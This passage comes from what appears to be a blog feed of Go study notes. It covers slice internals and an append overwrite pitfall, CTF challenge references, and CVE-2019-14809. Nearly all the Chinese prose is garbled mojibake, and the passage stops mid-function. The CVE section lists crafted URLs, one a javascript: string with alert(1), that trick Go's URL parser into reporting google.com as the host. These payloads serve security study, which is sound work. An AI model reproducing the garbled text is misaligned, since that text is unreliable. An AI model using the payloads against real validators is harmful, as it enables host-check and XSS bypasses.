&lt;p>6å°æ—¶é€Ÿé€šåŸºç¡€ï¼Œä»Šå¤©å°±å¯ä»¥å­¦åå°„å’Œå…¶å®ƒçš„é«˜çº§ç”¨æ³•äº†ï¼å°±å¯ä»¥è·Ÿé“¾å­äº†ï¼ï¼ï¼&lt;/p>
&lt;p>å¥½è€¶ï¼ï¼ï¼&lt;/p></description></item><item><title>Goå­¦ä¹ ç¬”è®°â… </title><link>https://amiaaaz.github.io/2022/02/26/go-study-notes-01/</link><pubDate>Sat, 26 Feb 2022 15:58:41 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/26/go-study-notes-01/</guid><description>&lt;h2 id="arrayslice-å˜é‡è¦†ç›–">array&amp;amp;slice å˜é‡è¦†ç›–&lt;/h2>
&lt;blockquote>
&lt;p>A slice is a descriptor of an array segment. It consists of a pointer to the array, the length of the segment, and its capacity (the maximum length of the segment).&lt;/p>
&lt;/blockquote>
&lt;p>&lt;a href="https://go.dev/blog/slices-intro">Go Slices: usage and internals&lt;/a>ï¼ˆå»ºè®®ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘è¿™é‡Œç®€å•å†™ä¸€ä¸‹&lt;/p>
&lt;p>goä¸­å®šä¹‰æ•°ç»„çš„åŸºæœ¬æ“ä½œæ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75715e">// intå‹ 4ä¸ªå…ƒç´ 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e">// ä¸‹æ ‡ä¸º1çš„å…ƒç´ å€¼ä¸º1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// i == 1
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŸºæœ¬ç±»ä¼¼äºcçš„å†™æ³•ï¼Œæ•°ç»„å˜é‡ä»£è¡¨æ•´ä¸ªæ•°ç»„ï¼Œä½†æ˜¯å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªæŒ‡å‘ç¬¬ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„æŒ‡é’ˆï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬åœ¨æ“ä½œæ•°ç»„ä¸­çš„å€¼æ—¶å®é™…ä¸Šæ˜¯åœ¨ç”¨å®ƒå€¼çš„copy&lt;/p>
&lt;p>å¯¹äºsliceï¼Œæ—¢å¯ä»¥ç›´æ¥å£°æ˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">letters&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;b&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;d&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹Ÿå¯ä»¥ç”¨å†…ç½®çš„&lt;code>make&lt;/code>å‡½æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// func make([]T, len, cap) []T
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// s == []byte{0, 0, 0, 0, 0}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­ï¼Œ&lt;code>[]T&lt;/code>è¡¨ç¤ºtypeï¼Œ&lt;code>len&lt;/code>è¡¨ç¤ºé•¿åº¦ï¼Œè€Œç¬¬ä¸‰ä¸ªå‚æ•°&lt;code>cap&lt;/code>æ˜¯å¯ä»¥ç¼ºçœçš„ï¼Œé»˜è®¤ç­‰äºlength&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…³äºsliceçš„ç»†èŠ‚æ˜¯æˆ‘ä»¬å…³æ³¨çš„é‡ç‚¹ï¼›å®ƒåŒ…å«äº†ä¸€ä¸ªæŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆptrï¼Œæ®µçš„é•¿åº¦lenï¼Œè¿˜æœ‰æ®µçš„æœ€å¤§é•¿åº¦cap â€”â€”â€”â€”å…¶å®è¯´åˆ°è¿™é‡Œï¼Œå¦‚æœæœ‰ç»éªŒçš„å·²ç»èƒ½çŸ¥é“é—®é¢˜æ‰€åœ¨äº†&lt;/p>
&lt;p>&lt;img src="https://go.dev/blog/slices-intro/slice-struct.png" alt="img">&lt;/p>
&lt;p>ä»¥ä¸Šé¢çš„&lt;code>s&lt;/code>ä¸ºä¾‹ï¼ˆç¼ºçœcapï¼‰ï¼Œç»“æ„æ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://go.dev/blog/slices-intro/slice-1.png" alt="img">&lt;/p>
&lt;p>å½“æˆ‘ä»¬å¯¹&lt;code>s&lt;/code>è¿›è¡Œåˆ‡ç‰‡æ“ä½œ&lt;code>s = s[2:4]&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://go.dev/blog/slices-intro/slice-2.png" alt="img">&lt;/p>
&lt;p>åˆ‡ç‰‡åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„sliceï¼ˆlenå’Œcapå‡ä¸åŒï¼‰ï¼Œpträ»æŒ‡å‘åŸæ•°ç»„&lt;/p>
&lt;p>æ‰€ä»¥ä¿®æ”¹æ–°çš„sliceçš„å…ƒç´ ä¼šä¿®æ”¹åŸå§‹sliceçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">d&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;o&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;d&amp;#39;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">e&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">d&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// e == []byte{&amp;#39;a&amp;#39;, &amp;#39;d&amp;#39;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// e == []byte{&amp;#39;a&amp;#39;, &amp;#39;m&amp;#39;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// d == []byte{&amp;#39;r&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;a&amp;#39;, &amp;#39;m&amp;#39;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ƒç´ çš„ä¸ªæ•°æ€»æ˜¯ä¸èƒ½è¶…è¿‡capä»£è¡¨çš„ä¸Šé™ï¼Œä¸ºäº†åŠ¨æ€åˆ†é…æ•°ç»„å¤§å°ï¼Œæˆ‘ä»¬æœ‰æ—¶ä¼šé€‰æ‹©è¿™æ ·çš„æ“ä½œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// +1 in case cap(s) == 0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">t&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">t&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åˆ›å»ºä¸€ä¸ªæ–°çš„slice å¹¶æŠŠåŸæ¥çš„å€¼å¤åˆ¶è¿›æ¥ï¼Œæœ‰ä¸€ä¸ªå†…ç½®å‡½æ•°å¯ä»¥ç›´æ¥åš&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#111">copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dst&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#75af00">T&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>copyå…è®¸ä¼ å…¥lengthä¸åŒçš„ä¸¤ä¸ªsliceï¼Œå®ƒä¼šå¸®æˆ‘ä»¬å¤„ç†å¥½å¯èƒ½å­˜åœ¨çš„æ½œåœ¨é—®é¢˜ï¼Œç›´æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">t&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">t&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å³å¯&lt;/p>
&lt;p>å•çº¯å‘sliceä¸­æ·»åŠ å…ƒç´ å¯ä»¥ä½¿ç”¨å†…ç½®å‡½æ•°&lt;code>append&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#75af00">T&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#75af00">T&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#75af00">T&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“å¤§äºcapæ—¶å®ƒä¼šè‡ªåŠ¨è°ƒæ•´ï¼Œå¦‚æœè¦appendä¸€ä¸ªsliceä¹Ÿæ˜¯å¯ä»¥çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;John&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Paul&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;George&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Ringo&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Pete&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// equivalent to &amp;#34;append(a, b[0], b[1], b[2])&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// a == []string{&amp;#34;John&amp;#34;, &amp;#34;Paul&amp;#34;, &amp;#34;George&amp;#34;, &amp;#34;Ringo&amp;#34;, &amp;#34;Pete&amp;#34;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™åˆ†æäº†åŠå¤©ï¼Œç»ˆäºåˆ°é‡ç‚¹äº†ï¼‰&lt;/p>
&lt;p>ä¸Šé¢æåˆ°äº†ï¼Œre-slicing a slice doesn&amp;rsquo;t make a copy of the underlying array, the full array will by kept in memory until it is no longer referenced&lt;/p>
&lt;p>ä¸¾ä¸ªä¾‹å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>[1 1 1 3] [1 1 1 3]
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬å‘ç°3ä¹‹å‰çš„2è¢«è¦†ç›–äº†&lt;/p>
&lt;p>å‡è®¾å½“aæ•°ç»„åœ¨appendä¸€ä¸ªå…ƒç´ æ—¶ï¼ŒptræŒ‡å‘0x1(å‡è®¾0x1ä¸ºæ•°ç»„åœ°å€), len=1, cap=2ï¼›appendç¬¬äºŒä¸ªå…ƒç´ æ—¶pträ¸å˜ï¼Œlen=2, cap=2ï¼›appendç¬¬ä¸‰ä¸ªå…ƒç´ æ—¶å®¹é‡ä¸å¤Ÿäº†å°±ä¼šåŠ¨æ€æ‰©å®¹ï¼Œcap=4, len=3ï¼Œæ‰€ä»¥ptræŒ‡å‘æ–°çš„0x2&lt;/p>
&lt;p>æ­¤æ—¶ptr=0x2, len=3, cap=4ï¼Œå†appendç¬¬å››ä¸ªå…ƒç´ ä¹Ÿå°±æ˜¯2çš„æ—¶å€™è¿˜ä¸éœ€è¦æ‰©å®¹ï¼Œè¿”å›ptr=0x2, len=4, cap=4ç»™bï¼Œä½†æ­¤æ—¶å¯¹äºaè€Œè¨€len=3ï¼Œç›¸å½“äºæ˜¯æ·»åŠ å…ƒç´ ç„¶åå¦å­˜ä¸ºäº†ï¼Œå¯¹åŸæ•°ç»„ä¸å½±å“ï¼Œcä¹Ÿæ˜¯ä¸€æ ·çš„æƒ…å†µ&lt;/p>
&lt;p>â€”â€”â€”â€”ä¸çŸ¥é“æˆ‘æœ‰æ²¡æœ‰è§£é‡Šæ¸…æ¥šQwQ&lt;/p>
&lt;h3 id="teaser-confidence-ctf-2019the-lottery">[Teaser CONFidence CTF 2019]The Lottery&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/mwarzynski/confidence2019_teaser_lottery">wp&lt;/a> | &lt;a href="https://blog.luckycat.moe/post/teaser-confidence-ctf-2019-the-lottery-writeup/">wp &lt;/a> | &lt;a href="https://ce-automne.github.io/2019/03/27/CONFidence%20-CTF-2019-The%20Lottery%20-WriteUp/">wp2&lt;/a>&lt;/p>
&lt;h3 id="roarctf-2019dist">[RoarCTF 2019]Dist&lt;/h3>
&lt;p>æ˜¯ä¸Šé¢é‚£ä¸ªé¢˜çš„æ”¹ç¼–&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://blog.szfszf.top/tech/roarctf2019-web-writeup/">wp1&lt;/a>&lt;/p>
&lt;h2 id="cve-2019-14809-è§£æhost">CVE-2019-14809 è§£æhost&lt;/h2>
&lt;pre tabindex="0">&lt;code>javascript://%250aalert(1)+&amp;#39;aa@google.com/a&amp;#39;a
http://[google.com]:80
http://google.com]:80
http://google.com]:80__Anything_you&amp;#39;d_like_sir
http://[google.com]FreeTextZoneHere]:80
&lt;/code>&lt;/pre>&lt;p>ç”±äºnet/urlåº“çš„é—®é¢˜ï¼Œè¿™äº›URIè§£æå‡ºæ¥Hostéƒ½æ˜¯google.com&lt;/p>
&lt;h3 id="æŸä¸çŸ¥åé¢˜">æŸä¸çŸ¥åé¢˜&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/url&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">SanCheck&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">input&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">error&lt;/span> &lt;span style="color:#111">{&lt;/span>
